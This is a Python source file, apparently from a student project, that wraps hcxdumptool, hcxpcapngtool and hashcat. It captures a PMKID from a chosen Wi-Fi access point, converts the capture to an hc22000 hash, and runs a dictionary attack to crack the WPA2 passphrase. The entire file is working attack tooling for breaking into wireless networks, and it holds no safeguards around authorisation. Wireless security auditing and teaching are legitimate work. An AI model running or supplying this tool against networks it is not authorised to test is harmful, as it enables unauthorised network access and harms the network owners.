import subprocess
import threading
import os
import signal
import time

class WPA2Crypto:
    """Wrapper para hcxdumptool y hcxpcapngtool. Extrae PMKID sin clientes."""

    def __init__(self, interface):
        self.interface = interface
        self.running = False
        self._process = None
        self._thread = None
        
        self.output_pcap = "/tmp/wiretrap_pmkid.pcapng"
        self.output_hash = "/tmp/wiretrap_hash.hc22000"
        self.wordlist = ""

        # Callbacks
        self.on_log = None     # fn(str)
        self.on_success = None # fn(hash_file_path)
        self.on_error = None   # fn(str)
        self.on_stopped = None # fn()

    def _log(self, msg):
        if self.on_log:
            self.on_log(msg)

    def start_pmkid_attack(self, target_bssid):
        if self.running:
            return
        
        # Limpiar basuras de pcap previas
        if os.path.exists(self.output_pcap):
            os.remove(self.output_pcap)
        if os.path.exists(self.output_hash):
            os.remove(self.output_hash)
            
        self.running = True
        self._thread = threading.Thread(target=self._run_hcxdumptool, args=(target_bssid,), daemon=True)
        self._thread.start()

    def _run_hcxdumptool(self, target_bssid):
        # Crear un filtro bpf para enfocarnos SÓLO en el AP objetivo y evitar ruido masivo
        target_bssid_clean = target_bssid.replace(':', '').lower()
        
        # Opciones de hcxdumptool (versiones nuevas >= 6.2.7):
        # -m: BSSID objetivo o listado de MACs (usaremos --filterlist_ap con un archivo si hubieran varios, 
        # pero es mas directo hacer que ataque a todos y nos quedemos el pcap, o usar un pequeño trick)
        
        # NOTA TFG: hcxdumptool ha cambiado mucho sus banderas últimamente.
        # Lo mas estandar es filtrar por mac address.
        filter_file = "/tmp/wtrap_filter.txt"
        with open(filter_file, "w") as f:
            f.write(target_bssid_clean + "\n")

        cmd = [
            "hcxdumptool",
            "-i", self.interface,
            "-w", self.output_pcap,
            "--filterlist_ap=" + filter_file,
            "--filtermode=2", # 2 = Only allow MACs in list
            "--enable_status=15" # Verbose status output
        ]

        self._log(f"[*] Lanzando hcxdumptool contra BSSID: {target_bssid}")
        
        try:
            # hcxdumptool needs full TTY or it gets mad. Popen needs careful handling.
            self._process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                preexec_fn=os.setsid # Permite matar a todos los hijos limpios
            )

            # Leer la salida en vivo para notar cuando pilla el PMKID
            for line in self._process.stdout:
                line = line.strip()
                if line:
                    if "EAPOL" in line or "PMKID" in line or "FOUND" in line:
                         self._log(f"[+] {line}")
                    # Otras lineas interesantes
                    elif "GTC" in line or "CHALLENGE" in line:
                        continue 
                    elif "tx=" in line and "rx=" in line:
                         # Es un status line, lo ignoramos para no spamear
                         continue
                if not self.running:
                    break

        except FileNotFoundError:
            if self.running and self.on_error:
                self.on_error("Error: 'hcxdumptool' no está instalado. Ejecuta: sudo apt install hcxdumptool")
        except Exception as e:
            if self.running and self.on_error:
                self.on_error(str(e))
        finally:
            self._cleanup_process()
            self._convert_to_hash(target_bssid)
            
            self.running = False
            if self.on_stopped:
                self.on_stopped()

    def _cleanup_process(self):
        if self._process:
            try:
                os.killpg(os.getpgid(self._process.pid), signal.SIGTERM)
                self._process.wait(timeout=2)
            except Exception:
                pass
            finally:
                self._process = None

    def _convert_to_hash(self, target_bssid):
        """Convierte el archivo .pcapng obtenido a .hc22000 usando hcxpcapngtool"""
        self._log(f"[*] Transformando paquetes interceptados a formato HC22000...")
        if not os.path.exists(self.output_pcap) or os.path.getsize(self.output_pcap) < 100:
            if self.on_error:
                self.on_error("Error: No se obtuvo suficiente tráfico para generar el hash o el PCAP está vacío.")
            return

        cmd = [
            "hcxpcapngtool",
            "-o", self.output_hash,
            self.output_pcap
        ]
        
        try:
            res = subprocess.run(cmd, capture_output=True, text=True)
            output = res.stdout + res.stderr
            
            header_found = False
            for line in output.split('\n'):
                if "EAPOL messages (WPA" in line or "PMKID" in line or "EAPOL M1" in line:
                    self._log(f"  {line}")
                if "written to" in line and self.output_hash in line:
                    header_found = True

            if os.path.exists(self.output_hash) and os.path.getsize(self.output_hash) > 0:
                self._log(f"[✓] ÉXITO: Hash WPA2 extraído correctamente -> {self.output_hash}")
                if self.on_success:
                    self.on_success(self.output_hash)
                    
                if self.wordlist:
                    self._run_hashcat()
            else:
                 if self.on_error:
                    self.on_error("Fallo Criptográfico: El PCAP capturado no contenía PMKIDs ni Handshakes válidos.")
        except FileNotFoundError:
            if self.on_error:
                self.on_error("Error: 'hcxpcapngtool' no encontrado. Instala el paquete hcxtools: sudo apt install hcxtools")
        except Exception as e:
            if self.on_error:
                self.on_error(f"Error procesando herramienta de hashes: {e}")

    def _run_hashcat(self):
        self._log(f"\n[*] INICIANDO CRACKEO HASHCAT (Diccionario: {self.wordlist}) ...")
        cmd = [
            "hashcat",
            "-m", "22000",
            "-a", "0",
            self.output_hash,
            self.wordlist
        ]
        try:
            p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in p.stdout:
                line = line.strip()
                if line:
                    self._log(f"  {line}")
                if not self.running:
                    p.terminate()
                    break
            p.wait()
            self._log("[✓] Proceso Hashcat finalizado.")
        except FileNotFoundError:
            self._log("❌ Error: 'hashcat' no está instalado en el sistema.")
        except Exception as e:
            self._log(f"❌ Error al ejecutar hashcat: {e}")

    def stop(self):
        self.running = False
        self._cleanup_process()
        if self._thread:
            # We don't join blocking forever, as _convert_to_hash runs after cleanup
            pass
